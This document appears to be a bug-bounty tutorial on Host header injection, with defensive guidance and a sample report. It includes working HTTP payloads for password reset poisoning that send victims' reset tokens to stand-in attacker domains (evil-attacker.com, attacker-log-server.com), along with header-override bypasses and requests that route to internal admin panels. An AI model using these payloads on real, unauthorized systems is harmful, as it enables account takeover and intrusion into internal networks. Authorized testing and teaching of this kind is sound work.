# Host Header Injection Attacks

## When to Use
- When testing Password Reset functionalities that generate emails containing "click here" links.
- When an application performs HTTP 301/302 redirects back to its own domain based on the Host header.
- To bypass virtual host routing to access internal development servers (e.g., accessing an unlisted `admin.target.localhost`).
- To combine with Web Cache Poisoning to serve malicious absolute URLs to innocent users.


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Probing for Reflection

```http
# Concept: The HTTP standard requires clients to supply a `Host` header indicating which 
# website they want to communicate with. If developers dynamically use this variable (e.g., `$_SERVER['HTTP_HOST']` in PHP) 
# instead of a static config, we can inject arbitrary domains.

# 1. Standard Request
GET /login HTTP/1.1
Host: target.com

HTTP/1.1 200 OK
<link rel="stylesheet" href="https://target.com/style.css">

# 2. Injected Request (Modify the Host header)
GET /login HTTP/1.1
Host: evil-attacker.com

# 3. Analyze Response
HTTP/1.1 200 OK
<link rel="stylesheet" href="https://evil-attacker.com/style.css">

# CRITICAL VULNERABILITY: The server blindly trusted our Host header to generate absolute URLs!
```

### Phase 2: Exploiting Password Reset Poisoning (High Impact)

```http
# Concept: Password resets send an email to the victim containing a unique token. 
# If the link domain is generated via the Host header, the attacker intercepts the token.

# 1. Attacker requests a password reset for victim@company.com
POST /reset_password HTTP/1.1
Host: evil-attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@company.com

# 2. What happens on the backend:
# Server generates token `XYZ123`.
# Server constructs email: "Click here to reset: https://" + HTTP_HOST + "/reset?token=XYZ123"
# The backend emails the victim: "Click here to reset: https://evil-attacker.com/reset?token=XYZ123"

# 3. Execution:
# Victim receives legitimate email from `noreply@company.com`.
# Victim clicks the heavily disguised link.
# The victim's browser navigates to `evil-attacker.com/reset?token=XYZ123`.
# The attacker logs the token, navigates to `target.com/reset?token=XYZ123`, and changes the victim's password. Account Takeover!
```

### Phase 3: Bypassing Host Validation (X-Forwarded-Host)

```text
# Concept: Some servers strictly validate the Host header and will return a 400 Bad Request
# or route to a default 404 page if you change it. You must use alternative headers.

# Request A (Double Host headers - ambiguous routing)
GET /reset HTTP/1.1
Host: target.com
Host: evil.com

# Request B (Absolute URL Override)
GET https://evil.com/reset HTTP/1.1
Host: target.com

# Request C (X-Forwarded / Front-end proxy override)
# WAFs and proxies often trust X-Forwarded-Host overriding the standard Host header.
GET /reset HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
X-Host: evil.com
X-Forwarded-Server: evil.com
```

### Phase 4: Accessing Internal Administration Panels (SSRF-like Routing Bypass)

```text
# Concept: Suppose `target.com` uses a reverse proxy. Internal tools sit on `admin.target.internal`.
# If you send a request to the public IP but supply the internal Host header, the proxy might 
# route you to the internal server.

POST / HTTP/1.1
Host: localhost
# or
Host: admin.internal

# Response:
HTTP/1.1 200 OK
<h2>Welcome to the Employee Intranet</h2>

# You bypassed the external firewall and accessed an unrouted internal VLAN.
```

## 🔵 Blue Team Detection & Defense
- **Absolute URLs**: Ensure web applications rely on a securely hardcoded configuration variable (e.g., `APP_URL="https://target.com"`) to define the base domain for all dynamic links, password reset emails, and redirects rather than dynamically evaluating the HTTP `Host` header.
- **Whitelist the Host Header**: Configure the web server (Nginx/Apache) to strictly validate the incoming `Host` header against a whitelist of expected top-level domains. If it does not match, return a `400 Bad Request` before the request is even passed to the backend application processing logic.
- **Drop Unsafe Proxy Headers**: If the application does not explicitly demand `X-Forwarded-Host` for CDN routing, strictly strip it at the edge load balancer.

## Key Concepts
| Concept | Description |
|---------|-------------|
| Host Header | A mandatory HTTP/1.1 header that specifies which website or domain the client wants to communicate with |
| Virtual Hosting | Running multiple websites on a single IP address, heavily relying on the Host header to route traffic to the correct backend folder |
| X-Forwarded-Host | A non-standard header used by load balancers and CDNs to inform the backend server what the original Host header requested by the client was |

## Output Format
```
Bug Bounty Report: Password Reset Poisoning leading to ATO
==========================================================
Vulnerability: Application Logic Flaw via Host Header Injection
Severity: Critical (CVSS 8.8)
Target: POST /auth/forgot_password

Description:
The target application dynamically constructs the password reset URL delivered via email by parsing the `Host` header supplied within the initial HTTP request. By manipulating the `Host` header to an attacker-controlled domain during the password reset initiation, the server emails the victim a malicious link containing their secure validity token. 

Reproduction Steps:
1. Initiate a password reset for the victim's email address.
2. Intercept the request and modify the `Host` header:
   POST /auth/forgot_password HTTP/1.1
   Host: attacker-log-server.com
3. Forward the request. 
4. The victim receives an official email from `support@target.com` containing the link: `https://attacker-log-server.com/auth/reset?token=SECRET_VALIDITY_TOKEN`.
5. Upon following the link, the token is recorded on the attacker's server, enabling instantaneous account takeover.

Impact:
Critical logic flaw allowing Account Takeover (ATO) requiring minor social engineering (the victim clicking a legitimate-looking email link).
```
